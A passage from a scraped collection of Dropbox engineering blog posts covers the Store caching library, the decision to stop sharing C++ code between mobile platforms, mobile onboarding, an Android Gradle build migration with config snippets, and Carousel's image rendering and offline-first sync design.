key. If available, it will be returned from the in-memory or disk cache suspend fun Store.fresh(key: Key): Value This method returns a single value for the given key that is obtained by querying the fetcher. suspend fun Store.stream(key: Key): Flow This method returns a Flow of the values for the given key. Here’s an example using get() which is a single shot function: Copy lifecycleScope.launchWhenStarted {\r\n  val article = store.get(key)\r\n  updateUI(article)\r\n} On a fresh install when you call store.get(key) , the network response will be stored first in the disk-cache (if provided) and in an in-memory cache afterwards. All subsequent calls to store.get(key) with the same key will retrieve the cached version of the data, minimizing unnecessary data calls. This prevents your app from fetching fresh data over the network (or from another external data source) in situations when doing so would unnecessarily waste bandwidth and battery. A great use case is any time your views are recreated after a rotation, they will be able to request the cached data from your Store . Having this data always available within a Store will help you avoid the need to retain copies of large objects in the view layer. With Store , your UI only needs to retain identifiers to use as keys while declaring whether it is ok to return the first value from cache or not. Busting through the cache Alternatively you can call store.fetch(key) to get a suspended result that skips the memory (and optional disk cache). A good use case is overnight background updates which use fetch() to make sure that calls to store.get()/stream() will not have to hit the network during normal usage. Another good use case for fetch() is when a user wants to pull to refresh. Calls to both fetch() and get() emit one value or throw an error. Stream For real-time updates, you may also call store.stream(key) which creates a Flow that emits each time the disk-cache emits or when there are loading/error events from network. You can think of stream() as a way to create reactive streams that update when your db or memory cache updates. Copy lifecycleScope.launchWhenStarted { \r\n  store.stream(StoreRequest.cached(3, refresh = false)) \r\n.collect{ }\r\n \r\n \r\nstore.stream(StoreRequest.get(3)) //skip cache, go directly to fetcher\r\n    .collect{  } Get on Cold Start and Restart Inflight multicasting To prevent duplicate requests for the same data, Store has a built-in inflight debouncer. If a call is made that is identical to a previous request that has yet to complete, the same response for the original request will be returned. This is useful for situations when your app needs to make many async calls for the same data at startup or when users are obsessively pulling to refresh. As an example, you can asynchronously call Store.get() from 12 different places on startup. The first call blocks while all others wait for the data to arrive. We saw a dramatic decrease in data usage after implementing this inflight logic in NYT. Disk as cache Store can enable disk caching by passing an implementation to the persister() function of the builder. Whenever a new network request is made, the Store will first write to the disk cache and then read from the disk cache to emit the value. Disk as single source of truth Providing a persister whose read function can return a Flow allows you to make Store treat your disk as the source of truth. Any changes made on disk, even if it is not made by Store, will update the active Store streams. This feature, combined with persistence libraries that provide observable queries (Jetpack Room, SQLDelight, or Realm) allows you to create offline first applications that can be used without an active network connection while still providing a great user experience. Copy StoreBuilder.fromNonFlow {api.fetchSubreddit(it, \"10\")}\r\n            .persister(\r\n              reader = db.postDao()::loadPosts,\r\n              writer = db.postDao()::insertPosts,\r\n              delete = db.postDao()::clearFeed)\r\n            .cachePolicy(MemoryPolicy)\r\n            .build() Stores don’t care how you’re storing or retrieving your data from disk. As a result, you can use Stores with object storage or any database (Realm, SQLite, Firebase, etc). If using SQLite we recommend working with Room developed by our friends on the Jetpack team. The above builder and Store stream API is our recommendation for how modern apps should be working with data. A fully configured store will give you the following capabilities: Memory caching with TTL and Size policies Disk caching including simple integration with Room Multicasting of responses to identical requestors Ability to get cached data or bust through your caches ( StoreRequest ) Ability to listen for any new emissions from network (stream) Structured concurrency through APIs build on Coroutines and Kotlin Flow Wrapping Up We hope you enjoyed learning about Store . We can't wait to hear about all the wonderful things the Android community will build with it and welcome any and all feedback. If you want to be even more involved, we are currently hiring all levels of mobile engineers in our NY, SF, and SEA offices. Come help us continue build great products both for our users and the developer community. This information was presented at KotlinConf, if you would rather watch a presentation . You can find the Store library here: github.com/dropbox/Store Portions of this page are modifications based on work created and shared by the Android Open Source Project and used according to terms described in the Creative Commons 2.5 Attribution License . // Tags Mobile Reactive Programming Android Open Source Kotlin // Copy link Link copied Link copied", "date": "2020-01-15"},
{"website": "Dropbox", "title": "The (not so) hidden cost of sharing code between iOS and Android", "author": ["Eyal Guthmann"], "link": "https://dropbox.tech/mobile/the-not-so-hidden-cost-of-sharing-code-between-ios-and-android", "abstract": "The overhead of custom frameworks and libraries The overhead of a custom development environment The overhead of addressing differences between the platforms The overhead of training, hiring, and retaining developers Conclusion Until very recently, Dropbox had a technical strategy on mobile of sharing code between iOS and Android via C++. The idea behind this strategy was simple—write the code once in C++ instead of twice in Java and Objective C. We adopted this C++ strategy back in 2013, when our mobile engineering team was relatively small and needed to support a fast growing mobile roadmap. We needed to find a way to leverage this small team to quickly ship lots of code on both Android and iOS. We have now completely backed off from this strategy in favor of using each platforms’ native languages (primarily Swift and Kotlin, which didn’t exist when we started out). This decision was due to the (not so) hidden cost associated with code sharing. Here are some of the things we learned as a company on what it costs to effectively share code. And they all stem from the same basic issue: By writing code in a non-standard fashion, we took on overhead that we would have not had to worry about had we stayed with the widely used platform defaults. This overhead ended up being more expensive than just writing the code twice. Before breaking down all the different types of overhead we encountered, I’d like to clarify that we never actually got to a point where most of our codebase was developed in C++. The overhead of C++ adoption actually prevented us from ever moving fully in this direction. It’s also worth noting that much larger companies like Google and Facebook have been developing scalable code-sharing solutions for several years. These solution have, so far, gained only limited adoption. While you can avoid some of the overhead described below by leveraging a 3rd party code sharing solution like React Native or Flutter, some will still apply (at least until one of these technologies gains traction and mature). For example, A irbnb sunset their use of R eact N ative for many of the same reasons outlined in this post. We can group the different types of overhead we faced into four main categories: The overhead of custom frameworks and libraries The easiest overhead to predict with C++ is the need to build frameworks and libraries. This roughly breaks down into 2 subcategories: Frameworks that would allow us to interact with the host environment to build a full fledged mobile app. For example: D jinni , a tool for generating cross-language type declarations and interface bindings A framework for running tasks in the background vs the main thread (a trivial task to perform in platform native languages). Libraries that would replace language defaults/open source standards that we could have used within the platform native languages. For example: json11 for JSON (de)serialization nn , non-nullable pointers for C++. None of this code would have been necessary had we stayed with the platform native languages, and our contributions to open source projects would have probably benefited more developers if they were in platform native languages. It’s possible we could have done a better job at leveraging open source C++ libraries, but the open source culture in the C++ development community was (is still?) not as strong as it is in the mobile development community (and in particular in the almost non-existent C++ mobile community). Note that these costs are particularly high in C++ (as opposed to other possible non-native languages like Python or C#) because it lacks of a single, full-featured standard library. That being said, C/C++ are the only languages with a compiler supported by both Google and Apple, so using a different language would have created a whole host of other problems to deal with. The overhead of a custom development environment The mobile ecosystem has a lot of tooling available to make development more efficient. Mobile IDEs are very rich and Google and Apple have invested a lot of resources in making them the best development experience for developers on their corresponding platforms. By moving away from the platforms’ defaults we gave away some of these benefits. Most notably, the debugging experience in a platform’s native language is generally superior to debugging in C++ code via the platform’s default IDE. One particularly memorable example is a bug that was causing a deadlock in our background threading framework leading the app to randomly crash. These types of bugs are hard to pin down even when you work on a simple, standard stack. Because this issue involved debugging multi-threaded code running back and forth between C++ and Java it took weeks to nail down! In addition to losing tools, we also had to invest time in building tools that would support C++ code sharing. Most importantly, we needed a custom build system that created libraries containing C++ code as well as Java and Objective-C wrappers and could generate targets that were understood by both Xcodebuild and Gradle. This system was a big drag on our resources as it needed to be constantly updated to support changes in two build systems. The overhead of addressing differences between the platforms Even though both iOS and Android apps are “mobile apps” that generally expose the same features and functionality, the platforms themselves have some differences that affect implementation. For example, the way that an application can execute background tasks on each platform is different. Even things that started fairly similar when we adopted this cross-platform strategy have greatly diverged over time (e.g., interaction with the camera roll). As a result, you can’t even really write the code once and have it run on the different platform out of the box. You have to spend a lot of time integrating the code into the different platforms and writing platform specific code (and sometime that code ends up in the C++ layer itself!). This makes the theoretical benefit of only writing the code once not live up to the promise, thus greatly reducing the benefits of this approach to begin with. The overhead of training, hiring, and retaining developers Last, but definitely not least, is the cost of training and/or hiring developers to work on our very custom stack. When Dropbox started with this mobile strategy, we had a core group of experienced C++ developers. This group started the C++ project and trained other mobile developers at Dropbox on how to contribute to the codebase. Over time, these developers moved on to other teams and other companies. The engineers who remained did not have sufficient experience to fill the technical leadership gap that opened up, and it became increasingly difficult to hire replacement senior engineers with relevant C++ experience who would be interested in mobile development. As a result, we ended up with a real lack of critical expertise to maintain the C++ codebase. The only way to restore this expertise was to invest substantially in one of two options: Find and hire candidates with this very specific skillset (we tried to hire for this role for over a year with no success) Train mobile (or C++) engineers in-house with the missing skillset, which is practically impossible to do when you no longer have someone with the desired skillset to perform the training. Even before the core group moved on, mobile engineers were generally not interested in learning C++, so finding people to train was a big issue, as well On top of the hiring problem, rolling our own tech stack created a retention problem—mobile developers simply did not want to work on a C++ project. This caused a lot of talented mobile engineers to leave the project rather than slog through a not-very-well maintained custom stack. In general, the mobile development community is very dynamic—new technologies and patterns emerge frequently and are adopted quickly. The best developers like to keep their skills up to date. Keeping up with the latest and greatest is a challenge in a mature product environment with a standard stack. You sacrifice adoption speed for stability. This challenge is hugely magnified when you lock yourself into a custom stack and out of the wider mobile ecosystem. Conclusion Although writing code once sounds like a great bargain, the associated overhead made the cost of this approach outweigh the benefits (which turned out to be smaller than expected anyway). In the end we no longer share mobile code via C++ (or any other non-standard way) and instead write code in the platform native languages. In addition we want our engineers to have a delightful experience and to be able to contribute back to the community. This is why we made the decision to align our practices with industry standards. We’re Hiring! If you are an Android or iOS engineer who gets excited about building amazing products and contributing to the mobile ecosystem, come join the team ! // Tags Mobile Open Source C++ Flutter Ios Android React // Copy link Link copied Link copied", "date": "2019-08-14"},
{"website": "Dropbox", "title": "Building Dropbox’s New User Experience for Mobile, Part 1", "author": ["Kat"], "link": "https://dropbox.tech/mobile/building-dropboxs-new-user-experience-for-mobile-part-1", "abstract": "At Dropbox, we treat growth as an integral part of the product experience. We look at major holes in user experience that slow growth, and we try to be creative in addressing the big picture, rather than trying to “growth hack.” We look for solutions that enable users to experience the full value of Dropbox. Dropbox has always been about accessing your stuff anywhere. Back when Dropbox launched six years ago, that meant installing Dropbox on your desktop and then accessing photos and docs on the web or on a smartphone, for some. Our smartphone apps were a way of helping users who already had Dropbox on their desktop view docs on the go, and they were designed as such. When users signed up on mobile devices, our apps assumed they already knew what Dropbox was and how to use it. On the growth team, we realized that we needed to redesign our mobile apps for a mobile-first world. We needed an experience that could get users up and running from their phones, even if they'd never touched Dropbox before. We spent a few months designing an end-to-end experience to educate and activate mobile users. After brainstorming sessions, prototypes, user studies, and A/B tests, we arrived at a new user experience that we think is simple and delightful. In this article, I’ll talk about the vision we had for new users to easily get started on Dropbox. Stay tuned for a blog post with more detail on the technical stack to power the new flows. The first barrier for many of our mobile-first users was simply having no idea what Dropbox is all about. Maybe that user’s phone already had Dropbox pre-installed, or their friend told them they should download it. Users opened the app with no idea about what it did, and all they saw was an account creation screen. That experience made sense for the old world where almost all users who opened the mobile app already had a Dropbox account on their desktop, but it doesn’t make sense today. We wanted to fix that. We landed on adding an introductory flow for new users before they create an account. Our ideas ranged from elaborate (an animated story showing a user taking a photo on her mobile device, the photo syncing automatically to her Dropbox, a bird swooping in and grabbing the device away, and then the user realizing that her photo was safe forever in Dropbox) to simple (a one-page list of how Dropbox was useful). The design that won was a simple, interactive flow with fun animations that succinctly conveyed the value proposition of Dropbox without too much distraction. We experimented with putting the intro flow before and after login. Even though it takes longer to get to the initial account creation stage, the percentage of users who logged in or created an account and the engagement of those users was higher with the tour before login. In this case, giving the users more information is better than getting them to log in as quickly as possible. We then designed a step-by-step flow that activated users by guiding them through a two-way sync. After completing the flow, users will have synced files from their phone to their desktop and back from the desktop to the phone. By backing up photos, files go from their phone to their computer. By installing the desktop client and adding a file from their computer, users can now see their files on their phone too. The two-way sync gives users a much deeper understanding of how Dropbox works. Importantly, each step in the checklist is clickable and guides users to complete the task. For instance, clicking on “upload a photo” will do something different based on the user’s state. If the user doesn’t have Camera Upload on, it will show a dialog that allows them to turn on camera upload. If Camera Upload is on but their wifi is off, it will take them to their wifi settings. By carefully guiding the user through each of these steps, we made sure nobody would quit out of frustration or confusion. At the “Install Dropbox on your computer” step, we ran into a roadblock with our goal of carefully guiding users through each step. It’s hard to hold a user’s hand when they venture into the world of their desktop. There are a lot of potential places where they could get lost. They could fail to find the download link, they could wander off while our ~40MB installer (it includes the Python runtime) is downloading and never return, they could open Dropbox but then forget their password, etc. We eventually came up with a flow that takes users from the mobile app to the signed-in desktop app with very little risk of attrition. Using a personalized QR code, the desktop connect flow allows users to securely log in to the website without typing in credentials and initiates an installer download. The “meta-installer” downloads almost instantly because of its small file size. When launched, it sets up permissions for Dropbox and then starts downloading the full installer and completes installation automatically. When Dropbox is fully installed, the server, the browser, and the desktop client work together to validate the client and allow it to safely log the user in without requiring the user to enter their email and password again. By the end of this flow, the user has a fully functioning, logged in, and ready-to-use desktop version of Dropbox up and running, and they never had to enter in their email address and password. This eliminates the possibility of a user mistakenly using a different email address or forgetting their password. The onboarding flow described above goes a long way in helping new users set up Dropbox on their computers, but there are some more interesting challenges left to solve that would help more users get started. For instance, it would be great to help users get the most important documents and photos from their computer into Dropbox automatically. Our experiments showed that users are much less likely to complete the last step of the Get Started flow : adding files to their Dropbox. If we help users more with this step, we could likely increase that number. The introductory flow and the desktop connect flow are both shipped on Android and iOS. The Get Started flow is still in its experimentation phase on Android. We think we have solved some fun design, product, and engineering challenges in making simple user experiences, but there’s still a lot left to do. If you're into engineering delightful experiences for users, we're hiring ! // Tags Mobile Ios UX Android // Copy link Link copied Link copied", "date": "2014-08-12"},
{"website": "Dropbox", "title": "Modernizing our Android build system: Part II, the execution", "author": ["David Chang"], "link": "https://dropbox.tech/mobile/modernizing-our-android-build-system-part-ii-the-execution", "abstract": "Foundation for migration Migration Post-migration Conclusion What does an engineer do after planning and decision on an approach? More planning! This time, the planning was laser-focused on what features to build into the new Android build system. Our team created a doc which outlined the milestones of the project and shared it to our internal customers for feedback. Subsequently, we agreed on the project scope and the key ideas for the migration. Foundation for migration Our goal in implementing a Gradle-only solution was to introduce flexibility, but also keep some of the great features BMBF had: guaranteed layered dependency order and reduced boilerplate in build files. We had to lay down the foundation before we could remove BMBF… Layered Dependencies At Dropbox, we add our modules into different layers. This is different from a MVx layer that one might be familiar with. Each module is in a layer, determined by the direct subdirectory of dbx/ that it’s in. Layers are used to give a quick broad sense of the scope of a module and to enforce high-level dependency constraints. Layers are ordered from “top” to “bottom,” which gives some high-level structure to the app and its dependencies. The layers also indicate the scope of the modules in them. The higher layers tend to be more specific and narrow in scope, while the lower layers are more general and broader. The 4 valid layers are listed below, in order from top to bottom, along with descriptions of the scope that modules in each layer should have. Layer Name Layer Description product Modules relating to a single Product (eg Paper or Dropbox). Modules in this layer will typically be under a subdirectory specifying which product they’re part of. core Dropbox-related modules that are shared between multiple products. For example, Stormcrow (our gating library) lives in this layer. base Non-Dropbox-specific modules that are common utilities. For instance, our HTTP libraries are in this layer. external Code not written at Dropbox which cannot be pulled in as a library binary. To give a concrete example, the module at dbx/core/stormcrow is in the core layer (because that is the immediate subdirectory of dbx/ that it’s in). It’s in core because Stormcrow is a Dropbox-specific concept, but is used by both DBApp and Paper. Since it is in core , this module cannot depend on a module in product , but can depend on other core modules, as well as base and external modules. In BMBF, the layered verifier was written in Python (since BMBF was written in Python) and there was a Gradle task that made a call to this Python script every time the app was built. This was a waste of resource because there was no good way to cache the task. We wanted to make the code maintainable by any mobile engineer, so we decided to add a layered verifier in buildSrc written in Kotlin. In addition, we got Gradle UP-TO-DATE checks for free. Reducing Boilerplate We wanted to allow an engineer to create a new module and not have to copy and paste a block of Gradle boilerplate from another module. We were able to achieve this by having a common Gradle file that defined what to apply for subprojects . In the end, most engineers can now create a new module and only need to focus on adding dependencies they require to their projects. Since the build.gradle files are no longer autogenerated by BMBF, engineers can now also define logic in their scripts that are not accounted for by the build system. common.gradle Copy subprojects { Project project -&gt;\n    project.apply from: xplatRoot.absolutePath + \"/tools/gradle/test_results_formatter.gradle\"\n    project.plugins.withId('com.android.library') {\n        project.apply plugin: 'kotlin-android'\n\n        if (project.hasProperty('apply_jacoco_plugin') {\n            // Runs in CI or when a local dev enables this property\n            project.apply from: xplatRoot.absolutePath + \"/tools/gradle/jacoco_test_coverage.gradle\"\n        }\n\n        project.android {\n            compileSdkVersion androidCompileSdkVersion\n            buildToolsVersion androidBuildToolsVersion\n\n            lintOptions {\n                ignore 'MissingTranslation'\n            }\n\n            defaultConfig {\n                minSdkVersion androidMinSdkVersion\n                targetSdkVersion androidTargetSdkVersion\n                testInstrumentationRunner 'com.dropbox.base.test.runner.DbxBaseTestRunner'\n                // This is needed for when we build this as a standalone target,\n                // which will typically be in tests.\n                multiDexEnabled true\n            }\n\n            compileOptions {\n                sourceCompatibility androidSourceCompatibility\n                targetCompatibility androidTargetCompatibility\n            }\n        }\n    } Link to gist With the common Gradle code in place, an engineer can write simple build.gradle files and we don’t need to copy and paste boilerplate around. Also, if we decide to make changes to the common code, it’s very simple since we can do it in one place. build.gradle Copy apply plugin: 'com.android.library'\n\ndependencies {\n    api project(':dbx:base:analytics_gen')\n    implementation project(':dbx:base:error')\n    implementation project(':dbx:base:json')\n    implementation project(':dbx:base:oxygen')\n    implementation commonlibs.guava\n} Link to gist Migration After laying down the foundation, we were ready to remove BMBF from autogenerating Gradle build files. This meant we needed to check-in all the autogenerated Gradle files. We made changes to the generators so that they would create the simplified versions of build.gradle based on the foundational work we did on the common Gradle code. This was a high-impact change, so we decided to do it immediately after a release went out, and we forbid changes to the repository until this change was landed . As one could imagine, some engineers had created some new modules while we were migrating. For those engineers, we had a back-channel to allow them to force migrate their BMBF config files to build.gradle . The transition was pretty smooth. Looking back, we realize that overcommunication was the key to our success. At every stage of our project, we communicated with our customers (mobile engineers) about our goals and what we planned to do. For high-impact changes like this, we sent out emails, Slack messages, and mentioned it in our weekly cross-functional mobile meetings**. We planned out our work so that for the week after we made this transition we were sure to reserved some capacity to deal with issues that engineers might face. Post-migration At this point, you might think, “You already migrated all the code to Gradle and got rid of BMBF build.gradle generation… all done!” The migration work unlocked the potential to clean up our directory structure—which was also the biggest time sink in our build times—so it allowed us to find other ways to improve build times. BMBF used a non-standard directory structure for Android. Also the BMBF modules were not in the same root as our Android project, which meant additional boilerplate to our settings.gradle files. /xplat/dbx/… → BMBF modules /xplat/android/… → Android projects BMBF structure (Before) Gradle default structure (After) java/src src/main/java android/src/AndroidManifest.xml src/main/AndroidManifest.xml jvm_test/src test/main/java android_test/src androidTest/main/java There were 75 modules written in BMBF and migrating them by hand would not have been very efficient. Mobile Platform could have required all product teams to migrate their modules to standard Gradle. Instead, we chose to tackle this problem by writing a script that would move all of the code into the right directory. In the end, this migration script was a 500 line Python file that accurately determined which BMBF modules needed to be migrated, updated the imports in the source files, and updated the project dependencies in the build.gradle files. BMBF-lite We made the decision to not completely remove BMBF because it was still responsible for code generation for Djinni, gating (Stormcrow) ADL files, and analytics ADL files. Previous to our project, the code generation was called every…single…time an engineer triggered the build, even though no changes were made to the source files. Another optimization we made was to introduce Watchman to watch the source directory and use it as an @Input and @Ouptut for our Gradle task. Watchman tells Gradle when to re-run the task and when the task is up to date. This along with a few other minor improvements reduced our P50 local build times by 20%. watchman.gradle Copy /*\n * Copyright (c) 2019, Dropbox, Inc. All rights reserved.\n */\n\n// Watchman generates a json file to depict the xplat file structure filtered on \"bmbf source\" files\ntask watchmanCheckIfCodegenNeeded(type:Exec) {\n    File outputJson = new File(project.buildDir, \"changed-files.json\")\n    File watchmanJson = new File(xplatRoot, \"tools/watchman/watchman-bmbf.json\")\n\n    workingDir xplatRoot\n    commandLine \"bash\", \"-c\", \"watchman watch-project $xplatRoot\"\n    commandLine \"bash\", \"-c\", \"watchman -j &lt; $watchmanJson.absolutePath\"\n\n    doFirst {\n        standardOutput new ByteArrayOutputStream()\n    }\n\n    doLast {\n        // Remove this piece of data that changes on every run (even with no modifications to the files)\n        def filteredText = standardOutput.toString().replaceFirst(\".*\\\"clock\\\".*\\n\", \"\")\n        if (outputJson.exists()) {\n            outputJson.delete()\n        }\n        outputJson &lt;&lt; filteredText\n        logger.lifecycle(\"Watchman query for BMBF files done: \" + outputJson)\n    }\n\n    // Save the json as the output so other tasks can reference it easily\n    outputs.files { outputJson }\n    // Always run this task\n    outputs.upToDateWhen { false }\n} Link to gist Conclusion Initially, we had a custom build system that solved our use cases across both platforms. Over time the customizations and costs outweighed the gains. Rather than continuing with BMBF we decided to split iOS and Android build systems to better take advantages of platform specific needs and tools. While this meant we lost some shared patterns and code we gained flexibility in not having a shared build system. Therefore, we made a decision to closer align with industry standards by going to Gradle and leaving the door open to re-evaluate Bazel in the future. As the mobile world continues to move at a blinding pace we want to be ready to adapt our architecture to support it for years to come. Finally, we were able to do this all with minimal interruption to Android engineers and without any additional boilerplate. We’re Hiring! We hope to have you on board to help us make such dramatic changes in the future. If you are an Android or iOS engineer who gets excited about solving problems at scale and sharing your findings with the community we’d love for you to come join the team ! Started in the middle? You can find part I here . // Tags Mobile Android // Copy link Link copied Link copied", "date": "2019-10-30"},
{"website": "Dropbox", "title": "Building Carousel, Part III: Drawing Images on Screen", "author": ["Tina Wen"], "link": "https://dropbox.tech/mobile/building-carousel-part-iii-drawing-images-on-screen", "abstract": "Making Carousel highly responsive was a critical part of providing an awesome user experience. Carousel wouldn’t be as usable or effective if the app stuttered or frequently caused users to wait while content loaded. In our last post , Drew discussed how we optimized our metadata loading pipeline to respond to data model changes quickly, while still providing fast lookups at UI bind time. With photo metadata in memory, our next challenge was drawing images to the screen. Dealing with tens of thousands of images while rendering at 60 frames per second was a challenge, especially in the mobile environments of iOS and Android. Today we are going to take a look at our image decoding and rendering pipeline to provide some insight into the solutions we’ve built. BACKGROUND : When work on Carousel first started, we set three key implementation goals for ourselves: Data availability: Users shouldn’t need to wait for data Data presentation: Scrolling should always be smooth - we should always be able to maintain a frame rate of 60 frames per second Data fidelity: Users should always see high fidelity images It was incredibly important to us that we meet these goals in the main Carousel views as the user scrolls through their photos. The task at hand will be familiar to those who have worked with drawing before: decode the thumbnails, which we store as JPEGs for data compression purposes, and display them in the UI. In general we lay out images three in a row in the main Carousel view. To determine what thumbnail size to use, we ran some UI experiments on modern phones such as the iPhone 5 or the Nexus 5, and decided that the cutoff resolution for a high fidelity thumbnail would be around 250px by 250px - anything lower resolution would look degraded in quality to the eye. Given the fact that Dropbox always pre-generates 256px by 256px thumbnails for all uploaded photos and videos, we were leaning toward using 256px by 256px thumbnails. To further validate this choice, we tested the network time needed to download such a thumbnail (~0.1s in batch over wifi), size on disk (~28KB), time to decode such a thumbnail (9ms on iPhone 5), and memory consumption after being decoded into a bitmap (0.2MB). All numbers looked reasonable, and we decided to go with these 256px by 256px thumbnails. Those who have worked with intensive image drawing might have predicted that image decoding would be a problem for us. And sure enough! While JPEGs are efficient for data compression, they are also expensive to decode into pixel data. As a data point, decoding a 256px by 256px thumbnail on a Nexus 4 takes about 10ms. For a 512px by 512px thumbnail, this increases to 50ms. A naive implementation might try to draw 256px by 256px thumbnails on the main thread synchronously. But in order to render at 60 frames per second, each frame needs to be rendered in 16ms. In a single frame, when a row of three thumbnails appears on screen, we must decode 3 thumbnails. With the naive implementation at 10ms per thumbnail, it would take 30ms to render that frame. You could see immediately that such an approach wouldn’t work without dropping frames and losing smooth scrolling. Naive Approach Good for : Data availability, and data fidelity Bad for : Data presentation FIRST SOLUTION A fairly standard approach to the problem above is to offload the decoding of the 256px by 256px thumbnails to a background thread. This frees up the main thread for drawing and preserves smooth scrolling. However, this yields a separate problem of not having content to display to the users as they scroll. Have you ever scrolled really quickly in an app and only seen placeholder squares where you should see images? We call this the “gray squares” problem and we wanted to avoid it in Carousel. First Solution: Background queue Good for : Data presentation and data fidelity Bad for : Data availability SECOND SOLUTION It became clear that if we wanted scrolling to be smooth we had to render in the background, but latency was an issue with that approach. What could we do to hide this? One idea was that if we couldn’t decode fast enough, we could decode less. Again we ran some UI experiments to find the lowest resolution thumbnails that looked degraded to the eye but still gave a high enough level of detail for a user to be able to understand the content of the photo. Turns out this is about 75px by 75px. We wanted these to be square thumbnails because they were displayed as square thumbnails in most Carousel views, and we didn’t want to decode any more than what needed to be displayed. Another advantage of having small thumbnails is that the variance of JPEG file size is smaller, so every image takes roughly the same amount of time to decode. Furthermore, we already pre-generated 75px by 75px size thumbnails on the server. Thus we decided to download and cache a 75px by 75px thumbnail along with a 256px by 256px thumbnail for each image. The 75px by 75px thumbnails takes roughly 1/5 of the time to render compared to 256px by 256px thumbnails, a big performance win gained at the cost of image quality. Here was the dilemma: just using those small thumbnails alone would go against our goal of data fidelity, but rendering big thumbnails would be too slow when the user scrolls quickly. We intuited that a user scrolling quickly would prefer to see a preview of each thumbnail, rather than nothing at all. So, what if we detect when the user scrolls quickly, and render 75px by 75px thumbs on the main thread on demand? Since it’s blazingly fast to render these low-resolution thumbnails (~2.7ms on iPhone 5), we could still preserve smooth scrolling. As soon as we detect the user is scrolling slowly, we add a rendering operation for 256px by 256px thumbnails onto a queue which is processed by a background thread. Decoding work is processed one by one from the beginning of the queue. As the user scrolls, new thumbnails will queue at the beginning since it’s most urgent to decode them. In order to only render relevant 256px by 256px thumbnails, we dequeue the stale requests as images go off the screen. This tight connection with UI ensures that no extra work is done to process offscreen thumbnails To further ensure no extra work is done and reduce CPU resource utilization, we only render the larger thumbnails when the user is likely to see them. We check if the user is scrolling too quickly by listening to draw callbacks (CADisplayLink on iOS) and measuring the difference in scroll offset by time. Second Solution: Background queue + low resolution thumbs on main thread Good for : Data presentation, data availability, and data fidelity WHAT WE BUILT We ran with the last approach and built an image renderer that contains a queue of 256px by 256px rendering jobs. After experimentation we settled on caching the resulting bitmaps, with a configurable cache size, which allows us to hold on to the most recently decoded thumbnails. In case the user scrolls back and forth, we don’t need to render the same thing again. As the diagram below indicates, when the user scrolls an image onto the screen, we check if we have the high-resolution bitmap already rendered first. If we do, we just display that already rendered image. If not, we render the 75px by 75px thumbnail on the main thread synchronously, and only queue the 256px by 256px thumbnail in the background if the user is scrolling slowly. If the user scrolls fast, we don’t queue the rendering jobs associated with 256px by 256px thumbnails until the scrolling slows down. As the user scrolls slowly, the background render queue doesn’t have much work to do, so the low-resolution to high-resolution swapping happens almost immediately. As the user flings really fast, nothing gets into the render queue, since we only display low-resolution thumbnails as they fly by quickly. As the user scrolling slows down, the background render queue starts to be fed with relevant on-screen thumbnails, so low-resolution to high-resolution thumbnail swapping is almost seamless. Rendering jobs are also dequeued as the associated thumbnails go off the screen, so the render queue only has a maximum of a screen-full of decode jobs. Image Rendering Queue There are of course a few additional enhancements we made along the way. For example, we prefetch offscreen thumbnails around the user’s viewport so we already have a window of pre-rendered thumbnails ready to go. Also, for events with a lot of photos, we show a blurred view with “+n” to indicate that the event is expandable – we don’t need to render these images with high-resolution before applying the blur effect. Performing the CPU-intensive task of decoding images on a background thread is a pretty standard practice in mobile engineering. However, that practice alone is not sufficient for our needs in Carousel, where we need to provide data availability and smooth scrolling for users with tens of thousands of photos. We hope this post, as well as the two preceding posts on Carousel performance, have given you some insight into the challenges we faced moving large amounts of data from our servers, to device local storage, to pixels on the screen. // Tags Mobile Carousel Photos // Copy link Link copied Link copied", "date": "2014-10-27"},
{"website": "Dropbox", "title": "Building Carousel, Part I: How we made our networked mobile app feel fast and local", "author": ["Stephen Poletto"], "link": "https://dropbox.tech/mobile/building-carousel-part-i-how-we-made-our-networked-mobile-app-feel-fast-and-local", "abstract": "When we began the journey of building a mobile app for Dropbox a few years ago, we started simple — our Android and iOS apps allowed our users to view their files on the go, and cache them for offline access. As smartphones became more popular, we realized we could provide another great service on mobile: automatic backup of all the photos and videos taken on these devices, so they’d be safe forever in Dropbox. Last Wednesday, on April 9, we took another giant leap forward with the introduction of Carousel . Carousel is a single home for all your photos and videos, independent of whether they’re local to the device you’re using, or already backed up to Dropbox. While Carousel seems pretty simple on the surface, there were a number of technical challenges we faced in building it. We needed to ship both an Android app and an iOS app on day one, which required us to think critically about how to share code between the two platforms. In order to support collections of over 100,000 photos, we needed to prioritize performance and find a way to beat the garbage collector on Android. In the coming weeks and months, we want to share the story of how we went about building Carousel and provide some insight into the hard engineering problems we solved along the way. Today, we’re going to focus on how we built Carousel to feel fast, responsive, and local, even though the data on which users operate is ultimately backed by the Dropbox servers. Make it Faster! As we thought about what we wanted in the next iteration of a mobile photos product, we kept coming back to this guiding principle: A Dropbox-powered gallery app can and should be just as fast as a local gallery app and should never force the user to wait to complete an action. Users should be able to view, curate, and share their photos regardless of state; they should never have to wait or worry about which photos are local and which are not. As long as our app was slower than a local gallery app, we knew it would never become the central place where our users go to view and interact with their photos. With this guiding principle in mind, we took a critical look at the Dropbox app’s photos tab, and identified two key problems that made the app feel way too slow: 1. The photos tab makes blocking HTTPS requests in order to sync user actions to the server. For instance, when the user tries to share a photo, this is what they see: The same is true when the user tries to delete a photo from the photos tab. In the event of no connectivity, these requests outright fail and require the user to try again later. 2. There’s no way to view and interact with photos that are local only to the device (i.e. not yet uploaded to Dropbox). These two problems, when combined, made the app especially difficult to use in the context of sharing photos with others. In order to share using the Dropbox app, users first had to wait for their photos to back up, then wait on a blocking network request to complete the share. The app also couldn't be used as a replacement for a traditional gallery, since photos captured offline can't be viewed at all. Client Architecture To solve these problems, we need to build a unified data model, in which local photos and remote photos are treated as equivalent objects, with all the same capabilities and properties. Second, considering that humans can perceive application response delays at around the 100 ms mark , we simply can't afford to make user-visible blocking network calls. Instead, we need to build an eventually consistent system, where the user can perform some action, immediately see the effect of that action locally , then eventually see the effect of that action globally on other devices. In the academic world, this is known as optimistic replication . To build a merged view of both local and server content, we first need the client to stay up to date with changes that are happening remotely on the server. To achieve that, we use HTTP long polling to get notified of changes, and use a variant of our delta API to pull those changes down. Delta returns the changes that have occurred to a user’s Dropbox since the last time the client called up to the server. That is, it provides the additions, deletions and modifications to photo metadata that have occurred since the prior cursor. When we fetch these changes, we write the most up-to-date server metadata into a server_photos table in SQLite . The server_photos table is purely a cache of the “truth,” which lives on the server. Meanwhile, our client-side camera roll scanner computes a fast hash of each photo to determine which photos have not yet been backed up to Dropbox. We turn a photo that needs to be uploaded into a photo_upload_operation , and likewise serialize it into SQLite. Finally, before we can render the view, we have a third input source in the form of client-side user actions. Whenever the user hides or deletes a photo in 